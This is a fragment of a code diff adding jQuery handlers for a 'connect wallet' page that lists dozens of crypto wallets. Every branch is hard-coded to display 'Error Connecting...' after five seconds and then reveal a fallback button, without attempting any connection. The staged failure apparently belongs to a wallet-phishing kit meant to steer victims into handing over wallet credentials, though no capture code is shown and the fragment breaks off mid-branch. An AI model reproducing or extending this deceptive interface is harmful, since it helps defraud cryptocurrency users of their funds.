+                $("#wallet_name").html("Pillar");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Pillar");
+                    $("#myImg").attr("src", "images/icons/download.png");
+                }, 5000);
+            } else if (id == "anchor") {
+                $("#loader_img").attr("src", "images/icons/Anchor.png");
+                $("#img").attr("src", "images/icons/Anchor.png");
+                $("#wallet_name").html("Anchor");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Anchor");
+                    $("#myImg").attr("src", "images/icons/Anchor.png");
+                }, 5000);
+            } else if (id == "onto") {
+                $("#loader_img").attr("src", "images/icons/onto-983003d35fe32bf916f9eda381f138f7.png");
+                $("#img").attr("src", "images/icons/onto-983003d35fe32bf916f9eda381f138f7.png");
+                $("#wallet_name").html("ONTO");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("ONTO");
+                    $("#myImg").attr("src", "images/icons/onto-983003d35fe32bf916f9eda381f138f7.png");
+                }, 5000);
+            } else if (id == "tokenpocket") {
+                $("#loader_img").attr("src", "images/icons/tokenpocket-57a4a886cc644e5237ac1558226154cb.png");
+                $("#img").attr("src", "images/icons/tokenpocket-57a4a886cc644e5237ac1558226154cb.png");
+                $("#wallet_name").html("TokenPocket");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("TokenPocket");
+                    $("#myImg").attr("src", "images/icons/tokenpocket-57a4a886cc644e5237ac1558226154cb.png");
+                }, 5000);
+            } else if (id == "mathwallet") {
+                $("#loader_img").attr("src", "images/icons/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png");
+                $("#img").attr("src", "images/icons/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png");
+                $("#wallet_name").html("MathWallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("MathWallet");
+                    $("#myImg").attr("src", "images/icons/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png");
+                }, 5000);
+            } else if (id == "bitpay") {
+                $("#loader_img").attr("src", "images/icons/bitpay-1573dd6c95eb38386f181048663590d0.jpg");
+                $("#img").attr("src", "images/icons/bitpay-1573dd6c95eb38386f181048663590d0.jpg");
+                $("#wallet_name").html("BitPay");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("BitPay");
+                    $("#myImg").attr("src", "images/icons/bitpay-1573dd6c95eb38386f181048663590d0.jpg");
+                }, 5000);
+            } else if (id == "maiar") {
+                $("#loader_img").attr("src", "images/icons/maiar.png");
+                $("#img").attr("src", "images/icons/maiar.png");
+                $("#wallet_name").html("Maiar");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Maiar");
+                    $("#myImg").attr("src", "images/icons/maiar.png");
+                }, 5000);
+            } else if (id == "ledger_live") {
+                $("#loader_img").attr("src", "images/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png");
+                $("#img").attr("src", "images/icons/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png");
+                $("#wallet_name").html("Ledger Live");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Ledger Live");
+                    $("#myImg").attr("src", "images/icons/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png");
+                }, 5000);
+            } else if (id == "walleth") {
+                $("#loader_img").attr("src", "images/icons/walleth-b60336f8dd9ea86285408cb4f96634d1.png");
+                $("#img").attr("src", "images/icons/walleth-b60336f8dd9ea86285408cb4f96634d1.png");
+                $("#wallet_name").html("Walleth");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Walleth");
+                    $("#myImg").attr("src", "images/icons/walleth-b60336f8dd9ea86285408cb4f96634d1.png");
+                }, 5000);
+            } else if (id == "authereum") {
+                $("#loader_img").attr("src", "images/icons/authereum-32f3939207b77c1837547d5ed4f86110.png");
+                $("#img").attr("src", "images/icons/authereum-32f3939207b77c1837547d5ed4f86110.png");
+                $("#wallet_name").html("Authereum");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Authereum");
+                    $("#myImg").attr("src", "images/icons/authereum-32f3939207b77c1837547d5ed4f86110.png");
+                }, 5000);
+            } else if (id == "huobi_wallet") {
+                $("#loader_img").attr("src", "images/icons/HuobiWallet.jpeg");
+                $("#img").attr("src", "images/icons/HuobiWallet.jpeg");
+                $("#wallet_name").html("Huobi");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Huobi");
+                    $("#myImg").attr("src", "images/icons/HuobiWallet.jpeg");
+                }, 5000);
+            } else if (id == "eidoo") {
+                $("#loader_img").attr("src", "images/icons/Eidoo.png");
+                $("#img").attr("src", "images/icons/Eidoo.png");
+                $("#wallet_name").html("Eidoo");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Eidoo");
+                    $("#myImg").attr("src", "images/icons/Eidoo.png");
+                }, 5000);
+            } else if (id == "mykey") {
+                $("#loader_img").attr("src", "images/icons/mykey-7419df5270c0406c80cba19fa5165923.png");
+                $("#img").attr("src", "images/icons/mykey-7419df5270c0406c80cba19fa5165923.png");
+                $("#wallet_name").html("MYKEY");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("MYKEY");
+                    $("#myImg").attr("src", "images/icons/mykey-7419df5270c0406c80cba19fa5165923.png");
+                }, 5000);
+            } else if (id == "loopring_wallet") {
+                $("#loader_img").attr("src", "images/icons/LoopringWallet.jpeg");
+                $("#img").attr("src", "images/icons/LoopringWallet.jpeg");
+                $("#wallet_name").html("Loopring Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Loopring");
+                    $("#myImg").attr("src", "images/icons/LoopringWallet.jpeg");
+                }, 5000);
+            } else if (id == "trustvault") {
+                $("#loader_img").attr("src", "images/icons/trustvault-9031a67f82293fc50ead978f936cfff3.png");
+                $("#img").attr("src", "images/icons/trustvault-9031a67f82293fc50ead978f936cfff3.png");
+                $("#wallet_name").html("TrustVault");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("TrustVault");
+                    $("#myImg").attr("src", "images/icons/trustvault-9031a67f82293fc50ead978f936cfff3.png");
+                }, 5000);
+            } else if (id == "coin98") {
+                $("#loader_img").attr("src", "images/icons/coin98-c5b50adaceaf474e48ef1dad150d0829.png");
+                $("#img").attr("src", "images/icons/coin98-c5b50adaceaf474e48ef1dad150d0829.png");
+                $("#wallet_name").html("Coin98");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Coin98");
+                    $("#myImg").attr("src", "images/icons/coin98-c5b50adaceaf474e48ef1dad150d0829.png");
+                }, 5000);
+            } else if (id == "coolWallet") {
+                $("#loader_img").attr("src", "images/icons/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png");
+                $("#img").attr("src", "images/icons/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png");
+                $("#wallet_name").html("CoolWallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("CoolWallet");
+                    $("#myImg").attr("src", "images/icons/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png");
+                }, 5000);
+            } else if (id == "alice") {
+                $("#loader_img").attr("src", "images/icons/Alice.png");
+                $("#img").attr("src", "images/icons/Alice.png");
+                $("#wallet_name").html("Alice");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Alice");
+                    $("#myImg").attr("src", "images/icons/Alice.png");
+                }, 5000);
+            } else if (id == "alphawallet") {
+                $("#loader_img").attr("src", "images/icons/AlphaWallet.jpeg");
+                $("#img").attr("src", "images/icons/AlphaWallet.jpeg");
+                $("#wallet_name").html("AlphaWallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Alpha");
+                    $("#myImg").attr("src", "images/icons/AlphaWallet.jpeg");
+                }, 5000);
+            } else if (id == "dcent") {
+                $("#loader_img").attr("src", "images/icons/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png");
+                $("#img").attr("src", "images/icons/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png");
+                $("#wallet_name").html("D'CENT Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("D'CENT");
+                    $("#myImg").attr("src", "images/icons/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png");
+                }, 5000);
+            } else if (id == "zelcore") {
+                $("#loader_img").attr("src", "images/icons/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png");
+                $("#img").attr("src", "images/icons/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png");
+                $("#wallet_name").html("ZelCore Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("ZelCore");
+                    $("#myImg").attr("src", "images/icons/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png");
+                }, 5000);
+            } else if (id == "nash") {
+                $("#loader_img").attr("src", "images/icons/Nash.jpeg");
+                $("#img").attr("src", "images/icons/Nash.jpeg");
+                $("#wallet_name").html("Nash Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Nash");
+                    $("#myImg").attr("src", "images/icons/Nash.jpeg");
+                }, 5000);
+            } else if (id == "coinomi") {
+                $("#loader_img").attr("src", "images/icons/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg");
+                $("#img").attr("src", "images/icons/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg");
+                $("#wallet_name").html("Coinomi");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Coinomi");
+                    $("#myImg").attr("src", "images/icons/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg");
+                }, 5000);
+            } else if (id == "gridplus") {
+                $("#loader_img").attr("src", "images/icons/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png");
+                $("#img").attr("src", "images/icons/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png");
+                $("#wallet_name").html("GridPlus");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("GridPlus");
+                    $("#myImg").attr("src", "images/icons/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png");
+                }, 5000);
+            } else if (id == "cybravo") {
+                $("#loader_img").attr("src", "images/icons/CYBAVOWallet.png");
+                $("#img").attr("src", "images/icons/CYBAVOWallet.png");
+                $("#wallet_name").html("CYBAVO Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("CYBAVO");
+                    $("#myImg").attr("src", "images/icons/CYBAVOWallet.png");
+                }, 5000);
+            } else if (id == "lob") {
+                $("#img").attr("src", "images/icons/LOBSTR.png");
+                $("#wallet_name").html("LOBSTR");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("LOBSTR");
+                    $("#myImg").attr("src", "images/icons/LOBSTR.png");
+                }, 5000);
+            } else if (id == "tokenary") {
+                $("#loader_img").attr("src", "images/icons/Tokenary.png");
+                $("#img").attr("src", "images/icons/Tokenary.png");
+                $("#wallet_name").html("Tokenary");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Tokenary");
+                    $("#myImg").attr("src", "images/icons/Tokenary.png");
+                }, 5000);
+            } else if (id == "wazirx") {
+                $("#loader_img").attr("src", "images/icons/Wazirx.png");
+                $("#img").attr("src", "images/icons/Wazirx.png");
+                $("#wallet_name").html("Wazirx");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Wazirx");
+                    $("#myImg").attr("src", "images/icons/Wazirx.png");
+                }, 5000);
+            } else if (id == "torus") {
+                $("#loader_img").attr("src", "images/icons/Torus.jpeg");
+                $("#img").attr("src", "images/icons/Torus.jpeg");
+                $("#wallet_name").html("Torus");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Torus");
+                    $("#myImg").attr("src", "images/icons/Torus.jpeg");
+                }, 5000);
+            } else if (id == "spatium") {
+                $("#loader_img").attr("src", "images/icons/Spatium.jpeg");
+                $("#img").attr("src", "images/icons/Spatium.jpeg");
+                $("#wallet_name").html("Spatium");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Spatium");
+                    $("#myImg").attr("src", "images/icons/Spatium.jpeg");
+                }, 5000);
+            } else if (id == "safepal") {
+                $("#loader_img").attr("src", "images/icons/SafePal.png");
+                $("#img").attr("src", "images/icons/SafePal.png");
+                $("#wallet_name").html("SafePal");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("SafePal");
+                    $("#myImg").attr("src", "images/icons/SafePal.png");
+                }, 5000);
+            } else if (id == "equal") {
+                $("#loader_img").attr("src", "images/icons/Equal.jpeg");
+                $("#img").attr("src", "images/icons/Equal.jpeg");
+                $("#wallet_name").html("Equal");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Equal");
+                    $("#myImg").attr("src", "images/icons/Equal.jpeg");
+                }, 5000);
+            } else if (id == "infinite") {
+                $("#loader_img").attr("src", "images/icons/Infinite.png");
+                $("#img").attr("src", "images/icons/Infinite.png");
+                $("#wallet_name").html("Infinite");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Infinite");
+                    $("#myImg").attr("src", "images/icons/Infinite.png");
+                }, 5000);
+            } else if (id == "wallet_io") {
+                $("#loader_img").attr("src", "images/icons/wallet.io.png");
+                $("#img").attr("src", "images/icons/wallet.io.png");
+                $("#wallet_name").html("wallet.io");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("wallet.io");
+                    $("#myImg").attr("src", "images/icons/wallet.io.png");
+                }, 5000);
+            } else if (id == "infinity_wallet") {
+                $("#loader_img").attr("src", "images/icons/Infinity Wallet.png");
+                $("#img").attr("src", "images/icons/Infinity Wallet.png");
+                $("#wallet_name").html("Infinity Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Infinity");
+                    $("#myImg").attr("src", "images/icons/Infinity Wallet.png");
+                }, 5000);
+            } else if (id == "ownbit") {
+                $("#loader_img").attr("src", "images/icons/Ownbit.png");
+                $("#img").attr("src", "images/icons/Ownbit.png");
+                $("#wallet_name").html("Ownbit");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Ownbit");
+                    $("#myImg").attr("src", "images/icons/Ownbit.png");
+                }, 5000);
+            } else if (id == "easyPocket") {
+                $("#loader_img").attr("src", "images/icons/EasyPocket.jpg");
+                $("#img").attr("src", "images/icons/EasyPocket.jpg");
+                $("#wallet_name").html("EasyPocket");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("EasyPocket");
+                    $("#myImg").attr("src", "images/icons/EasyPocket.jpg");
+                }, 5000);
+            } else if (id == "bridge_wallet") {
+                $("#loader_img").attr("src", "images/icons/BridgeWallet.png");
+                $("#img").attr("src", "images/icons/BridgeWallet.png");
+                $("#wallet_name").html("Bridge Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Bridge");
+                    $("#myImg").attr("src", "images/icons/BridgeWallet.png");
+                }, 5000);
+            } else if (id == "sparkpoint") {
+                $("#loader_img").attr("src", "images/icons/SparkPoint.png");
+                $("#img").attr("src", "images/icons/SparkPoint.png");
+                $("#wallet_name").html("SparkPoint");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("SparkPoint");
+                    $("#myImg").attr("src", "images/icons/SparkPoint.png");
+                }, 5000);
+            } else if (id == "via") {
+                $("#loader_img").attr("src", "images/icons/ViaWallet.png");
+                $("#img").attr("src", "images/icons/ViaWallet.png");
+                $("#wallet_name").html("Via Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Via");
+                    $("#myImg").attr("src", "images/icons/ViaWallet.png");
+                }, 5000);
+            } else if (id == "bitkeep") {
+                $("#loader_img").attr("src", "images/icons/BitKeep.png");
+                $("#img").attr("src", "images/icons/BitKeep.png");
+                $("#wallet_name").html("BitKeep");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("BitKeep");
+                    $("#myImg").attr("src", "images/icons/BitKeep.png");
+                }, 5000);
+            } else if (id == "vision") {
+                $("#loader_img").attr("src", "images/icons/Vision.png");
+                $("#img").attr("src", "images/icons/Vision.png");
+                $("#wallet_name").html("Vision");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Vision");
+                    $("#myImg").attr("src", "images/icons/Vision.png");
+                }, 5000);
+            } else if (id == "swft") {
+                $("#loader_img").attr("src", "images/icons/SWFTWallet.png");
+                $("#img").attr("src", "images/icons/SWFTWallet.png");
+                $("#wallet_name").html("SWFT Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("SWFT");
+                    $("#myImg").attr("src", "images/icons/SWFTWallet.png");
+                }, 5000);
+            } else if (id == "peakdefi") {
+                $("#loader_img").attr("src", "images/icons/PEAKDEFI.png");
+                $("#img").attr("src", "images/icons/PEAKDEFI.png");
+                $("#wallet_name").html("PEAKDEFI Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("PEAKDEFI");
+                    $("#myImg").attr("src", "images/icons/PEAKDEFI.png");
+                }, 5000);
+            } else if (id == "cosmostation") {
+                $("#loader_img").attr("src", "images/icons/Cosmostation.png");
+                $("#img").attr("src", "images/icons/Cosmostation.png");
+                $("#wallet_name").html("Cosmostation");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Cosmostation");
+                    $("#myImg").attr("src", "images/icons/Cosmostation.png");
+                }, 5000);
+            } else if (id == "graph protocol") {
+                $("#loader_img").attr("src", "images/icons/GraphProtocol.jpg");
+                $("#img").attr("src", "images/icons/GraphProtocol.jpg");
+                $("#wallet_name").html("Graph Protocol");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Graph Protocol");
+                    $("#myImg").attr("src", "images/icons/GraphProtocol.jpg");
+                }, 5000);
+            } else if (id == "kardiachain") {
+                $("#loader_img").attr("src", "images/icons/KardiaChain.png");
+                $("#img").attr("src", "images/icons/KardiaChain.png");
+                $("#wallet_name").html("KardiaChain");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("KardiaChain");
+                    $("#myImg").attr("src", "images/icons/KardiaChain.png");
+                }, 5000);
+            } else if (id == "keplr") {
+                $("#loader_img").attr("src", "images/icons/Keplr.png");
+                $("#img").attr("src", "images/icons/Keplr.png");
+                $("#wallet_name").html("Keplr");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Keplr");
+                    $("#myImg").attr("src", "images/icons/Keplr.png");
+                }, 5000);
+            } else if (id == "harmony") {
+                $("#loader_img").attr("src", "images/icons/Harmony.png");
+                $("#img").attr("src", "images/icons/Harmony.png");
+                $("#wallet_name").html("Harmony");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Harmony");
+                    $("#myImg").attr("src", "images/icons/Harmony.png");
+                }, 5000);
+            } else if (id == "iconex") {
+                $("#loader_img").attr("src", "images/icons/ICONex.png");
+                $("#img").attr("src", "images/icons/ICONex.png");
+                $("#wallet_name").html("ICONex");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("ICONex");
+                    $("#myImg").attr("src", "images/icons/ICONex.png");
+                }, 5000);
+            } else if (id == "fetch") {
+                $("#loader_img").attr("src", "images/icons/fetch.jpg");
+                $("#img").attr("src", "images/icons/fetch.jpg");
+                $("#wallet_name").html("Fetch");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Fetch");
+                    $("#myImg").attr("src", "images/icons/fetch.jpg");
+                }, 5000);
+            } else if (id == "xdc") {
+                $("#loader_img").attr("src", "images/icons/XDCWallet.png");
+                $("#img").attr("src", "images/icons/XDCWallet.png");
+                $("#wallet_name").html("XDC Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("XDC");
+                    $("#myImg").attr("src", "images/icons/XDCWallet.png");
+                }, 5000);
+            } else if (id == "unstoppable") {
+                $("#loader_img").attr("src", "images/icons/Unstoppable Wallet.png");
+                $("#img").attr("src", "images/icons/Unstoppable Wallet.png");
+                $("#wallet_name").html("Unstoppable Wallet");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
+                    $("#con_button").css("display", "inline-flex");
+                    $("#walletname1").html("Unstoppable");
+                    $("#myImg").attr("src", "images/icons/Unstoppable Wallet.png");
+                }, 5000);
+            } else if (id == "meetone") {
+                $("#loader_img").attr("src", "images/icons/MEETONE.jpg");
+                $("#img").attr("src", "images/icons/MEETONE.jpg");
+                $("#wallet_name").html("MEET. ONE");
+                setTimeout(function() {
+                    // $this.attr('disabled', false);
+                    $("#con_stats").html("Error Connecting...");
+                    $("#con_stats").css("color", "red");
+                    $(".loader").css("display", "none");
